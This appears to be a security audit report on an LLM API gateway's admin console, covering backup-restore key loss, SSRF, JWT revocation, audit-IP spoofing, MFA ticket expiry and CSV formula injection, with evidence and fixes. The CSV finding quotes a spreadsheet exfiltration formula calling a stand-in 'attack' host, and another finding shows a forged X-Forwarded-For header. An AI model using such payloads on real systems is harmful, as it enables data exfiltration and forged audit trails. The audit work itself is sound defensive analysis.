title: restoreBackup / config rollback silently DESTROYS all provider API keys (APIKeyEnc lost by json:"-", then provider table wiped and recreated without it)
evidence: bundle.go:81-93 — RestoreBundle first wipes the provider table `if err := tx.Where("1 = 1").Delete(table).Error; err != nil {` (table list line 82 includes `&model.Provider{}`) then recreates providers with `if len(b.Providers) > 0 { if err := tx.Create(&b.Providers).Error`. But the bundle JSON never contains the ciphertext: model.go:107 `APIKeyEnc    string    `gorm:"type:text" json:"-"` // AES-GCM 加密存储 (REQ-005 ④)` — so every JSON.Marshal of ConfigBundle (backup.go:31 `body, _ := json.Marshal(b)`, configstatus.go:68 `body, _ := json.MarshalIndent(b, "", "  ")`, runtime/manager.go:386 `if b, err := json.Marshal(bundle); err == nil {` for ConfigVersion snapshots) drops it, contradicting bundle.go:15 comment `// ConfigBundle 可序列化的全量配置（密钥保持 DB 原样密文，跨版本/备份一致）。`. runtime/manager.go:214-218: `if plain, err := m.enc.Decrypt(p.APIKeyEnc); err == nil { ... } else { p.APIKey = "" // 解密失败：保留空密钥，该上游调用时会失败 }` — empty APIKeyEnc fails decrypt, so after any restore/rollback every upstream is called with no credential. Meanwhile APIKeyMasked (model.go:109, `json:"api_key_masked"`) DOES round-trip, so the admin UI still displays a masked key and the wipe looks healthy.
impact: Every use of the two safety nets (POST /backups/restore — even restoring a legitimately created backup by ID — and POST /config/rollback, configstatus.go:52-60) hard-deletes and recreates every provider row without its encrypted API key. All gateway traffic then authenticates to upstream providers with empty keys (upstream 401s), and the loss is unrecoverable from any backup or snapshot because no copy of APIKeyEnc ever existed in the JSON. The operation records no evidence of the wipe (see authz-2/authz-6) and the masked-key display hides the damage. Any authed admin action (rollback is a one-click button) causes a silent, permanent credential outage requiring manual re-entry of every provider key.
recommendation: Either include APIKeyEnc in the bundle under an explicit field (e.g. marshal into a dedicated bundle struct with the ciphertext, keeping it out of HTTP list responses) so it round-trips, or — minimally — make RestoreBundle preserve existing APIKeyEnc on recreate (upsert instead of delete+create, or re-read ciphertext by provider ID before recreating) and refuse restore/rollback with a clear error when providers would lose credentials. Add a test asserting provider count AND non-empty APIKeyEnc after a restore cycle.
mitigations_checked: Checked that gateway API keys are NOT destroyed: ConfigBundle.APIKeys (bundle.go:24) is parsed but RestoreBundle never touches the api_keys table (bundle.go:79-143 has no APIKey write), and KeyHash is json:"-" (model.go:37). Also confirmed api_key_masked being the only key material in backups means backups do not exfiltrate provider credentials (positive finding).

title: POST /backups/restore applies arbitrary, unvalidated, self-supplied JSON as full configuration — one request can disable guardrails, global MFA and call-auditing, and re-point the alert webhook
recommendation: Validate bundle provenance/shape before RestoreBundle: reject unknown settings keys (allowlist general/failover/output_filter/quota_alerts/security, keep excluding config_meta exactly as export does), require the content to match a stored BackupRecord (drop the free-text `content` field or gate it behind a distinct, separately-recorded 'import' flow), record the SHA-256 of applied content plus a before-snapshot in the op log, and capture an automatic pre-restore backup.
mitigations_checked: RestoreBundle cannot inject gateway API keys or admin users (no api_keys/admin_users writes in bundle.go:79-143); LoadKV defaults mean malformed values fail safe to enabled MFA/guard rather than bypass; TRUSTED_PROXIES and gateway IP allowlist (gateway.go:222) are not affected by settings.

title: Operation-audit source IP trusts X-Forwarded-For unconditionally, regardless of TRUSTED_PROXIES — admin audit trail is attacker-spoofable
evidence:
server.go:108-116: `func clientIP(c *gin.Context) string {
	if v := c.GetHeader("X-Forwarded-For"); v != "" {` … returns the client-supplied header verbatim; it is fed to every audit row at server.go:95: `audit.LogOp(s.db, operatorOf(c), action, module, target, before, after, clientIP(c),` → OperationLog.IP (model/model.go:281). This contradicts the rest of the deployment: main.go:90-94 sets `engine.SetTrustedProxies(cfg.TrustedProxies)` with the comment '默认空 → 不信任任何 X-Forwarded-For，c.ClientIP() 取 TCP 对端', and the gateway correctly uses the protected value (gateway/gateway.go:222 `if !rec.IPAllowed(c.ClientIP()) {`). The access log also uses c.ClientIP() (main.go:117) — only the persisted OperationLog.IP is spoofable.
impact: Anyone holding an admin JWT can forge the IP of any recorded operation (restore, user MFA unbind, key deletion, settings downgrade) by adding `X-Forwarded-For: 10.0.0.5`, destroying the evidentiary value of the single most important forensic field in the audit store, and letting an intrusion appear to originate from a trusted internal/ops IP. Real impact beyond the stated 'TRUSTED_PROXIES empty by default' fact: the admin audit trail was assumed to honor that setting and does not.
recommendation: Use gin's proxy-aware `c.ClientIP()` in clientIP() (SetTrustedProxies already implements the correct semantics), and treat the raw XFF header only when the TCP peer is in the trusted set. Backfill nothing — just stop writing untrusted values.
mitigations_checked: Confirmed gateway authn/IP-allowlist is NOT affected (uses c.ClientIP()); confirmed the access-log line uses c.ClientIP(); the only consumer of this helper is OperationLog.IP via recordOp.

title: Admin JWT is valid for 24h and is never revoked — logout, password change and even MFA reconfiguration do not invalidate stolen tokens; /audit/ws additionally puts that long-lived token into a query string
impact: A token leak — the query string is written by any fronting nginx/Caddy access log by default (the app itself logs path-only, main.go:109 `path := c.Request.URL.Path`, verified), a browser history, or a Referer-style capture — grants full admin (restore, key issuance, MFA downgrade) for up to 24 hours, and the victim cannot evict it: 'logging out' and even changing the password do not stop it, so the natural incident-response actions provide zero protection. This is the multiplier that makes findings authz-1/2/6 exploitable by anyone who glimpses one string.
recommendation: Add a per-user token epoch (e.g. `token_version` column bumped on logout/password-change/MFA changes, embedded as a claim and checked in AuthMiddleware), or a small in-memory jti denylist; shorten admin JWT lifetime to ~1h with silent re-issue; and bind /audit/ws to a short-lived single-purpose ticket (the mfaStore pattern already exists) instead of the session JWT.
mitigations_checked: App access log confirmed NOT to include query strings (main.go:106-118); JWT parse pins HMAC method (jwt.go:31-33); no cookie is ever set (grep Set-Cookie → none) so header tokens are not auto-attached by browsers; residual exposure is proxy/browser-side URL capture plus the 24h non-revocability.

title: Server-side request forgery (SSRF) with response oracle: provider base_url is never validated and /providers/:id/test + health checker + quota webhook form un-restricted egress channels from the admin console
impact: An admin (or anyone holding a token per authz-4) gets a low-and-slow internal port scanner + HTTP GET-read primitive with reflected status, latency, resolved IPs and body excerpts (cloud metadata at 169.254.169.254, internal admin panels, localhost services), plus a POST egress channel (webhook) — i.e., pivoting from the app server into networks the process can reach. Rated medium, not high, because it is authed and the product is legitimately an outbound proxy; the gap is the total absence of egress restriction on the *admin-triggered, response-reflecting* paths.
recommendation: Add a shared URL guard for every server-side fetch (testProvider, probeAnthropicMessages, health checker, webhook): parse with url.Parse, require http/https, resolve and reject private/loopback/link-local ranges (config-configurable allowlist for self-hosted LAN upstreams), set CheckRedirect to re-validate each hop, and truncate genericize error strings returned to the client.
mitigations_checked: Gateway forwarding to base_url is the documented by-design passthrough and excluded; provider keys are AES-GCM encrypted at rest; the test endpoint's key header only reaches the same URL the operator typed, but redirect-following means the final hop may differ (noted above).

title: recordOp coverage gaps: the most destructive/ sensitive operations log no before/after (restore, rollback, batch-replace, updateModel), failed logins are never logged, successful logins log operator="anonymous", and bulk sensitive downloads are unaudited
impact: After an incident (token leak per authz-4), the operator cannot answer the two questions that matter: (1) what was changed and what was lost — restore/rollback/replace leave no diff, so the provider-key wipe of authz-1 is invisible in the audit UI; (2) who is attacking me — failed logins are unlogged (no brute-force visibility), logins attribute to 'anonymous', and mass exfiltration of call logs/backups/config leaves no read trail. Audit is present but systematically weakest exactly on the dangerous operations.
recommendation: Before restore/rollback/batch-replace, capture a machine-readable summary (counts + sha256 of affected tables / bundle content hash + full bundle reference) into before/after; log login failures with supplied username and IP via a dedicated action; pass the authenticated username into issueLogin's recordOp; and add recordOp("read","export",...) to the download/export endpoints.
mitigations_checked: Per-object CRUD (providers, apikeys, quotas, rate limits, guard rules, settings KV) consistently calls recordOp with before/after; provider/api-key secret columns are protected from op-log serialization by json:"-" tags (model.go:37, 107, 290), so audit rows do not themselves leak ciphertext; audit retention cleanup exists (audit/audit.go:88-106).

title: CSV formula injection: gateway-audit CSV export writes client-controlled model/error fields unsanitized into spreadsheet cells
impact: A gateway API-key holder submits `model="=HYPERLINK(\"http://attack/\"&[...])"` or a WEBSERVICE()/DDE formula as a single request; when the admin later exports /audit/calls (or /audit/operations) and opens it in Excel/LibreOffice, the formula executes in the admin's office context — classic exfil/execution bridge from untrusted input into the trusted analyst's machine, on the product's own documented 'export' workflow.
recommendation: In the CSV writer, prefix any cell whose first rune is = + - @ TAB CR with a single quote (or space), applied centrally to both exportCallLogs and exportOpLogs; additionally sanitize r.BlockReason/r.ErrorMsg before storage (they embed client text).
mitigations_checked: Content-Type is text/csv with BOM (no HTML/XSS via that response); the JSON audit list renders the same strings but React escapes text nodes; the injection requires opening the CSV in a formula-capable spreadsheet — real but one step removed.

title: Unauthenticated /metrics echoes API-key-holder-controlled model strings as Prometheus labels, and the backing map is unbounded (label-cardinality memory growth, never evicted)
impact: Beyond the documented 'no auth for easy scraping' trade-off: (1) any API-key customer (a population the operator cannot treat as trusted — keys are handed to clients) can mint arbitrarily many permanent in-memory series by varying `model` on failed calls, a slow monotonic memory + latency leak with no restart path short of process bounce; (2) the anonymous endpoint discloses internal model-alias inventory, provider names/protocols and per-minute error timing, and reflects the attacker's own strings back, which doubles as a beacon/channel readable by anyone who can reach /metrics.
recommendation: Canonicalize/limit the Observe key: only count known aliases, otherwise bucket into a fixed `"__other__"` label, and cap the stats map size with LRU eviction; at minimum restrict /metrics by bind address or add a scrape token (a static token in a header is compatible with Prometheus).
mitigations_checked: promEsc prevents label breakout/injection (metrics/prom.go:43-45); no secrets or raw request text are in the rendered metrics; gateway auth (gateway.go:209-220) is required to reach Handle, so the DoS requires a valid key — impact framed accordingly.

title: MFA second-factor login tickets have no expiry in the default in-memory store (doc claims 5 minutes) and the ticket branch completes login without ever re-checking the password
impact: A login response body that was rendered but not completed (abandoned 2FA prompt on a shared/kiosk/VDI machine, devtools session storage, a screenshot, an XSS on the console origin) yields a state that — for the lifetime of the process — still satisfies step 2 with only the TOTP code, no password. It is not a 2FA bypass (code still required) and there is no evidence the app logs these tokens, so severity is low, but it converts a transient intermediate value into an indefinite passwordless entry point, contradicting the file's own security comment.
recommendation: Give memMFA entries a per-ticket expiry (store {uid, expiresAt} and reject after 5 minutes in PopLoginTicket, mirroring mfaTicketTTL), or sweep with a ticker; keep Pop semantics otherwise.
mitigations_checked: Tickets are 128-bit random (crypto.RandomHex(16)), single-use via LoadAndDelete/GETDEL, uid-bound (auth.go:52-55 rejects cross-user tickets), absent from access logs (main.go:109 logs path only), and failed TOTP on the ticket path still accrues lockout (auth.go:66-67).

title: Single-role admin API lets any session unbind other users' MFA, unlock accounts and enumerate all usernames, with no self-protection or step-up for security-state changes
evidence:
users.go:37-52 unbindUserMfa deletes another account's MFA with only AuthMiddleware in front (routes.go:134 `api.POST("/users/:id/unbind-mfa", s.AuthMiddleware(), s.unbindUserMfa)`): `s.db.Model(&model.AdminUser{}).Where("id = ?", u.ID).Updates(map[string]any{
		"mfa_secret": "", "mfa_enabled": false, "mfa_bound_at": nil, "recovery_codes_json": ""})` — no role check, no ownership check, no requirement that the caller themselves has MFA, and combined with settings.saveSecurity (settings.go:115-128 → `tx.Save` of `security` KV) any session can also flip global MFA off. unlockUser (users.go:54-64) can defeat lockout repeatedly: `Updates(map[string]any{"failed_logins": 0, "locked_until": nil})`. listUsers discloses every username (users.go:22-33). No second factor is demanded for any of these, and no role column exists at all (model.go:13-26).
impact: Honestly scoped: the product is single-tenant — the only admin is bootstrapped once (main.go:164-184) and there is no user-creation API (routes.go:133-135 exposes only list/unbind-mfa/unlock), so with ≤1 admin this is mostly a hardening gap rather than an active privilege path; the DELETE /:id 'IDOR' style lookups across the admin API similarly lack ownership checks but there is no second tenant to be the victim. The concrete residual impact is that a token compromise (authz-4) immediately includes 'disable my victim's MFA / unlock them while brute-forcing / enumerate accounts', and that an operator who DOES provision multiple admins (via direct DB inserts) gets zero separation: the weakest session can silently strip the strongest one's second factor.
recommendation: Require the acting session to itself be MFA-bound (and freshly authenticated) for user-scoped security operations; forbid self-unbind and add a confirm parameter; if a multi-admin roadmap exists, introduce the role column now rather than retrofitting; rate-limit login failures per IP in addition to per-account lockout so unlockUser cannot be used as a brute-force assist.
mitigations_checked: Self-service disable still requires a TOTP/recovery code (auth.go:267-277); unbind/unlock are recorded (users.go:50, 63) albeit with spoofable IP (authz-3); no endpoint can delete admin users or create new ones; JWT claims (uid) are signed and cannot be forged with a valid secret rotation.
